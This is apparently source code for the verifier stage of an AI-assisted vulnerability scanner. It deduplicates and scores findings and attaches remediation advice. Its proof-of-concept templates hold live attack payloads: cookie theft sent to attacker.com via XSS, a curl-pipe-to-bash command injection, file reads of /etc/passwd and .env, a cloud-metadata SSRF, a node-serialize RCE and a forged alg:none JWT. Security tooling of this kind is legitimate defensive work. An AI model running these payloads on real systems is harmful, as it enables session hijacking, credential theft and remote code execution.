/**
 * VERIFIER AGENT
 * Responsibility: Take raw findings from Pattern + LLM agents and:
 *   1. Deduplicate overlapping findings
 *   2. Enrich each finding with PoC payload and fix recommendation
 *   3. Ask Mistral to verify ambiguous findings and generate exact exploits
 *   4. Assign final confidence scores
 *
 * This is the "senior engineer review" step before reporting.
 */

'use strict';

const { ChatMistralAI }      = require('@langchain/mistralai');
const { HumanMessage, SystemMessage } = require('@langchain/core/messages');

// ─── Pre-built PoC templates for common vuln types ───────────────────────────
const POC_TEMPLATES = {
  'SQL Injection': (f) => ({
    poc: `curl -s -X POST ${f.endpoint || '<endpoint>'} \\
  -H "Content-Type: application/json" \\
  -d '{"${f.param || 'username'}": "admin\\'--", "${f.param2 || 'password'}": "x"}'`,
    unionPoc: `GET /api/search?q=' UNION SELECT ${Array(6).fill('null').join(',')}--`,
    risk: 'Authentication bypass, data exfiltration, full DB dump',
  }),
  'XSS': (f) => ({
    poc: `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`,
    storedPoc: `POST body: {"content": "<script>document.location='https://attacker.com?c='+document.cookie</script>"}`,
    risk: 'Session hijacking, credential theft, defacement',
  }),
  'Command Injection': (f) => ({
    poc: `{"host": "127.0.0.1; id"}`,
    rce: `{"host": "127.0.0.1; curl https://attacker.com/shell.sh | bash"}`,
    risk: 'Full Remote Code Execution, server takeover',
  }),
  'Path Traversal': () => ({
    poc: `GET /api/files/read?filepath=../../etc/passwd`,
    poc2: `GET /api/files/read?filepath=../../.env`,
    risk: 'Read arbitrary files including credentials, private keys',
  }),
  'SSRF': () => ({
    poc: `GET /api/proxy?url=http://169.254.169.254/latest/meta-data/`,
    poc2: `GET /api/proxy?url=file:///etc/shadow`,
    risk: 'Access internal network, cloud metadata, exfiltrate credentials',
  }),
  'Insecure Deserialization': () => ({
    poc: `{"data": "{\\"rce\\":\\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,s){console.log(s)})()}()\\"}"}`,
    risk: 'Remote Code Execution via IIFE in node-serialize',
  }),
  'Prototype Pollution': () => ({
    poc: `{"settings": {"__proto__": {"isAdmin": true, "role": "admin"}}}`,
    risk: 'Privilege escalation, bypass security checks globally',
  }),
  'Broken Authentication': () => ({
    poc: `JWT with alg:none — eyJhbGciOiJub25lIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`,
    risk: 'Authenticate as any user including admin without knowing password',
  }),
  'Hardcoded Secret': (f) => ({
    poc: `The ${f.name || 'credential'} is directly visible in source code`,
    risk: 'Anyone with repo access (or leaked code) can use these credentials',
  }),
  'Open Redirect': () => ({
    poc: `GET /api/redirect?to=https://evil-phishing-site.com`,
    risk: 'Phishing attacks using trusted domain, OAuth token theft',
  }),
  'IDOR': () => ({
    poc: `GET /api/users/1 (as user ID 2) — returns victim user data including password`,
    risk: 'Access any user account data, escalate to admin',
  }),
};

const FIX_TEMPLATES = {
  'SQL Injection':           'Use parameterized queries: db.prepare("SELECT * FROM users WHERE id = ?").get(id)',
  'XSS':                     'Sanitize output with DOMPurify. In React never use dangerouslySetInnerHTML with user input.',
  'Command Injection':       'Never pass user input to exec(). Use allowlists for commands. Use child_process.spawn with array args.',
  'Path Traversal':          'Validate and sanitize paths: const safe = path.resolve(base, untrusted); if (!safe.startsWith(base)) throw Error;',
  'SSRF':                    'Validate URLs against an allowlist of domains. Block internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x).',
  'Insecure Deserialization': 'Remove node-serialize. Use JSON.parse() for data transfer only.',
  'Prototype Pollution':     'Use Object.create(null) for plain objects. Use structuredClone() instead of _.merge() with user data.',
  'Broken Authentication':   'Use jwt.verify() with explicit algorithms: ["HS256"]. Never allow alg:none.',
  'Hardcoded Secret':        'Move all secrets to environment variables. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault).',
  'Open Redirect':           'Validate redirect URL is on allowlisted domains. Use relative paths for internal redirects.',
  'IDOR':                    'Always check resource ownership: if (resource.userId !== req.user.id) return 403;',
  'Mass Assignment':         'Explicitly whitelist allowed fields: const { username, email } = req.body; (never spread req.body)',
};

class VerifierAgent {
  constructor(apiKey, model, logger) {
    this.name = 'VerifierAgent';
    this.logger = logger || console.log;

    this.llm = new ChatMistralAI({
      apiKey: apiKey,
      model: model || 'mistral-large-latest',
      temperature: 0.1,
      maxTokens: 2048,
    });
  }

  log(msg) {
    this.logger(`[VerifierAgent] ${msg}`);
  }

  /**
   * Deduplicate findings by (file, line, category).
   */
  deduplicate(allFindings) {
    const seen = new Map();
    const unique = [];

    for (const f of allFindings) {
      const key = `${f.file || ''}:${f.line || 0}:${(f.category || f.name || '').toLowerCase()}`;
      if (!seen.has(key)) {
        seen.set(key, true);
        unique.push(f);
      } else {
        // Merge: if duplicate has higher severity, upgrade
        const existing = unique.find((u) =>
          `${u.file || ''}:${u.line || 0}:${(u.category || u.name || '').toLowerCase()}` === key
        );
        if (existing) {
          const sevOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
          if ((sevOrder[f.severity] ?? 5) < (sevOrder[existing.severity] ?? 5)) {
            existing.severity = f.severity;
          }
          // Merge PoC from LLM findings
          if (f.poc && !existing.poc) existing.poc = f.poc;
          if (f.fix && !existing.fix) existing.fix = f.fix;
        }
      }
    }
    return unique;
  }

  /**
   * Enrich a finding with PoC and fix templates.
   */
  enrich(finding) {
    const cat = finding.category || finding.name || '';
    const template = POC_TEMPLATES[cat];
    const fixTemplate = FIX_TEMPLATES[cat];

    if (template && !finding.poc) {
      const poc = template(finding);
      finding.poc = poc.poc || poc.rce || '';
      finding.pocDetails = poc;
    }

    if (fixTemplate && !finding.fix) {
      finding.fix = fixTemplate;
    }

    // Assign confidence
    const hasLine    = finding.line > 0 ? 20 : 0;
    const hasSnippet = finding.snippet ? 20 : 0;
    const hasPoc     = finding.poc ? 20 : 0;
    const hasCwe     = finding.cwe ? 20 : 0;
    const fromLlm    = finding.source === 'LLM Analysis' ? 20 : 0;
    finding.confidence = hasLine + hasSnippet + hasPoc + hasCwe + fromLlm;
    finding.confidenceLabel = finding.confidence >= 80 ? 'High' : finding.confidence >= 50 ? 'Medium' : 'Low';

    return finding;
  }

  /**
   * Use LLM to verify a batch of ambiguous/high-severity findings.
   */
  async llmVerify(findings, fileContents) {
    if (findings.length === 0) return findings;

    const summary = findings.slice(0, 10).map((f, i) =>
      `${i + 1}. [${f.severity}] ${f.category} in ${f.file?.split(/[\\/]/).pop()}:${f.line} — "${f.description}"`
    ).join('\n');

    const relevantFileContent = fileContents
      .filter((fc) => findings.some((f) => f.file === fc.filePath))
      .slice(0, 3)
      .map((fc) => `### ${fc.filePath}\n${fc.content.slice(0, 2000)}`)
      .join('\n\n');

    const prompt = `Review these security findings and for each one:
1. Confirm if it's a true positive (is the vulnerability actually exploitable?)
2. Add a specific exploit PoC if missing
3. Add exact fix recommendation

Findings:
${summary}

Relevant code:
${relevantFileContent}

Return as JSON array with same structure plus "verified": true/false and updated "poc" and "fix" fields.`;

    try {
      const response = await this.llm.invoke([
        new SystemMessage('You are a security expert verifying vulnerability findings. Be precise and technical.'),
        new HumanMessage(prompt),
      ]);

      const raw = response.content;
      const text = typeof raw === 'string'
        ? raw
        : Array.isArray(raw)
          ? raw.map((c) => (typeof c === 'string' ? c : (c.type === 'text' ? c.text : ''))).join('')
          : '';
      const jsonMatch = text.match(/\[[\s\S]*\]/);
      if (jsonMatch) {
        const verified = JSON.parse(jsonMatch[0]);
        // Merge verified data back
        for (let i = 0; i < Math.min(findings.length, verified.length); i++) {
          if (verified[i].poc) findings[i].poc = verified[i].poc;
          if (verified[i].fix) findings[i].fix = verified[i].fix;
          findings[i].verified = verified[i].verified !== false;
        }
      }
    } catch (e) {
      this.log(`LLM verification error: ${e.message}`);
    }

    return findings;
  }

  /**
   * Main entry point.
   */
  async run(patternResults, llmResults, scannerResult) {
    const t0 = Date.now();
    this.log('Starting verification and enrichment...');

    // Combine all findings
    const allRaw = [
      ...(patternResults.patternFindings || []),
      ...(patternResults.secretFindings || []),
      ...(patternResults.astFindings || []),
      ...(patternResults.depFindings || []),
      ...(llmResults.llmFindings || []),
    ];

    this.log(`Total raw findings: ${allRaw.length}, deduplicating...`);

    // Deduplicate
    const unique = this.deduplicate(allRaw);
    this.log(`After dedup: ${unique.length} unique findings`);

    // Enrich with PoC and fix templates
    const enriched = unique.map((f) => this.enrich(f));

    // LLM verification of top CRITICAL/HIGH findings
    const criticalHigh = enriched.filter((f) => ['CRITICAL', 'HIGH'].includes(f.severity)).slice(0, 15);
    if (criticalHigh.length > 0) {
      this.log(`LLM verifying ${criticalHigh.length} critical/high findings...`);
      await this.llmVerify(criticalHigh, scannerResult.allFiles || []);
    }

    const elapsed = Date.now() - t0;
    this.log(`Verification done in ${elapsed}ms — ${enriched.length} verified findings`);

    return {
      verifiedFindings: enriched,
      stats: {
        total: enriched.length,
        critical: enriched.filter((f) => f.severity === 'CRITICAL').length,
        high:     enriched.filter((f) => f.severity === 'HIGH').length,
        medium:   enriched.filter((f) => f.severity === 'MEDIUM').length,
        low:      enriched.filter((f) => f.severity === 'LOW').length,
        durationMs: elapsed,
      },
    };
  }
}

module.exports = VerifierAgent;
